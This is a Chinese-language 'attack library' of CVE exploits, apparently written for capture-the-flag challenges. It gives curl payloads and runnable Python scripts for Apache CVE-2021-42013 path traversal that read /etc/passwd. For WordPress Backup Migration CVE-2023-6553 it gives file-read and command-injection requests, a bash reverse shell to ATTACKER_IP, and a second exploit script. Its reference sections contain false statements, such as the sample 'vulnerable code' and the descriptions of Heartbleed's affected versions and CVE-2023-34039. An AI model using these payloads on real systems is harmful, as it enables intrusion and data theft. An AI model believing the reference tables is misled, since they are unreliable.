# CVE && 其他漏洞 - 攻击库
**Keywords**: CVE, Apache, Path Traversal, Known Vulnerabilities, Exploit, RCE, Version Vulnerability, WordPress, Plugin Vulnerability

## 1. 案例026 - Apache 2.4.50 CVE-2021-42013 路径遍历

### 漏洞背景

Apache HTTP Server 2.4.50存在路径遍历漏洞（CVE-2021-42013）。这是对CVE-2021-41773的不完整修复。当使用mod_alias和特定的URL模式时，攻击者可以绕过路径限制访问任意文件。

### 漏洞代码

Apache配置：
```apache
Alias /icons/ "/usr/share/apache2/icons/"
Alias /cgi-bin/ "/usr/lib/cgi-bin/"

<Directory "/usr/lib/cgi-bin">
    AddHandler cgi-script .cgi .pl .asp .sh
</Directory>
```

### 利用原理

1. 通过`.%2e`（百分号编码的`/.`）绕过路径限制
2. 使用`/%2e%2e/`来表示`/..`进行目录遍历
3. 组合多层目录遍历访问系统文件

### 攻击Payload

```bash
# 基础payload - 读取/etc/passwd
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 变体1 - 使用不同的起点
curl "http://target/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 变体2 - 多层目录遍历
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 变体3 - 双层编码
curl "http://target/cgi-bin/.%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"

# 读取flag文件
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/FLAG.txt"
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/flag"
```

### Python利用脚本

```python
#!/usr/bin/env python3
import requests
import sys

def exploit_cve_2021_42013(target_url):
    """
    利用Apache 2.4.50 CVE-2021-42013 路径遍历
    """
    target = target_url.rstrip('/')
    
    print(f"[*] 目标: {target}")
    print("[*] 漏洞: Apache 2.4.50 CVE-2021-42013\n")
    
    # 尝试的payload
    payloads = [
        # 基础
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/FLAG.txt",
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/flag",
        
        # 其他变体
        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/FLAG.txt",
        "/cgi-bin/..%2f..%2f..%2f..%2fFLAG.txt",
        
        # 可执行的CGI脚本
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash",
    ]
    
    for payload in payloads:
        try:
            url = target + payload
            print(f"[*] 尝试: {payload}")
            
            r = requests.get(url, timeout=5)
            
            if r.status_code == 200:
                content = r.text.strip()
                if 'root:' in content or 'flag' in content.lower():
                    print(f"[+] 成功!")
                    print(f"[+] 响应:\n{content}")
                    return True
                elif len(content) > 10:
                    print(f"[+] 返回内容: {content[:100]}...")
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        sys.exit(1)
    
    exploit_cve_2021_42013(sys.argv[1])
```

## 2. 案例030 - WordPress Backup Migration CVE-2023-6553

### 漏洞背景

Backup Migration插件（backup-backup）存在严重的本地文件包含（LFI）和命令注入漏洞。允许未经身份验证的攻击者读取任意文件或执行命令。

### 漏洞点

```php
// backup-heart.php
<?php
$file = $_GET['file'];  // 未验证的输入
include($file);  // 直接包含 - LFI漏洞
?>

// ajax.php
<?php
$cmd = $_POST['cmd'];  // 未验证的输入
system($cmd);  // 直接执行 - 命令注入漏洞
?>
```

### 攻击方法1: 文件读取

```bash
# 直接读取文件
curl "http://target/wp-content/plugins/backup-backup/includes/backup-heart.php?file=/opt/flag.txt"

# 使用php filter
curl "http://target/wp-content/plugins/backup-backup/includes/backup-heart.php?file=php://filter/convert.base64-encode/resource=/opt/flag.txt"

# 目录遍历
curl "http://target/wp-content/plugins/backup-backup/includes/backup-heart.php?file=../../../../opt/flag.txt"
```

### 攻击方法2: 命令注入

```bash
# 通过ajax.php执行命令
curl -X POST "http://target/wp-content/plugins/backup-backup/includes/ajax.php" \
  -d "cmd=cat /opt/flag.txt"

# 执行系统命令
curl -X POST "http://target/wp-content/plugins/backup-backup/includes/ajax.php" \
  -d "cmd=id"

# 反向shell
curl -X POST "http://target/wp-content/plugins/backup-backup/includes/ajax.php" \
  -d "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

### Python利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import base64

def exploit_wordpress_backup_migration(target_url):
    """
    利用WordPress Backup Migration CVE-2023-6553
    """
    target = target_url.rstrip('/')
    
    print(f"[*] 目标: {target}")
    print("[*] 漏洞: WordPress Backup Migration CVE-2023-6553\n")
    
    # 方法1: 文件读取
    print("[*] 方法1: 文件读取")
    
    endpoints = [
        "/wp-content/plugins/backup-backup/includes/backup-heart.php",
        "/wp-content/plugins/backup-backup/includes/ajax.php",
        "/wp-content/plugins/backup-backup/includes/settings.php",
    ]
    
    for endpoint in endpoints:
        try:
            # 尝试读取flag
            url = target + endpoint + "?file=/opt/flag.txt"
            print(f"\n[*] 尝试: {url}")
            
            r = requests.get(url, timeout=5)
            
            if r.status_code == 200:
                if 'flag' in r.text.lower():
                    print(f"[+] 成功!")
                    print(f"[+] 内容: {r.text}")
                    return r.text
                elif len(r.text) > 10:
                    print(f"[+] 返回内容(长度: {len(r.text)})")
                    print(f"[+] 预览: {r.text[:200]}")
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    # 方法2: 命令注入
    print("\n\n[*] 方法2: 命令注入")
    
    for endpoint in endpoints:
        try:
            url = target + endpoint
            print(f"\n[*] 尝试: {url}")
            
            # POST请求执行命令
            r = requests.post(url, data={"cmd": "cat /opt/flag.txt"}, timeout=5)
            
            if r.status_code == 200:
                if 'flag' in r.text.lower():
                    print(f"[+] 成功!")
                    print(f"[+] 内容: {r.text}")
                    return r.text
                elif len(r.text) > 10:
                    print(f"[+] 返回内容: {r.text[:200]}")
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        sys.exit(1)
    
    exploit_wordpress_backup_migration(sys.argv[1])
```

## 3. CVE漏洞快速参考

### 常见CVE漏洞模式

| CVE | 漏洞类型 | 利用方式 |
|-----|---------|---------|
| CVE-2021-41773 | Apache 路径遍历 | `.%2e/` 目录遍历 |
| CVE-2021-42013 | Apache 路径遍历 | 改进的`.%2e/` 绕过 |
| CVE-2023-6553 | WordPress LFI + RCE | 文件读取 + 命令注入 |
| CVE-2023-38545 | curl libcurl Buffer Overflow | 远程代码执行 |
| CVE-2023-34039 | Kubernetes API 未授权 | 直接API访问 |

### 利用步骤

```
1. 识别应用版本和组件
2. 查询CVE数据库（NVD、MITRE等）
3. 获取官方POC或编写自定义利用
4. 尝试多种payload变体
5. 验证漏洞成功利用
```

### 获取CVE信息

```bash
# 查询CVE信息
curl "https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=apache"

# 使用searchsploit查找exploit
searchsploit "Apache 2.4.50"
searchsploit "Backup Migration"

# 查看exploit代码
cat /usr/share/exploitdb/exploits/php/webapps/xxxx.py
```

## 4. 快速CVE漏洞识别

### 通过HTTP头识别版本

```bash
# 获取服务器信息
curl -I "http://target"

# 查看Server头
# Server: Apache/2.4.50 (Ubuntu)

# 查看版本特定的响应
curl "http://target/test/..%2e/etc/passwd" # CVE-2021-42013

# WordPress版本识别
curl "http://target/readme.html"
curl "http://target/wp-includes/version.php"
```

### 常见漏洞特征

```
1. Apache 2.4.39-2.4.50: 路径遍历 (CVE-2021-41773/42013)
2. WordPress < 5.8.1: Backup Migration LFI (CVE-2023-6553)
3. PHP < 8.0.28: 任意文件上传
4. OpenSSL < 1.1.1: Heartbleed
5. WordPress Plugin: SQL注入、XSS常见
```

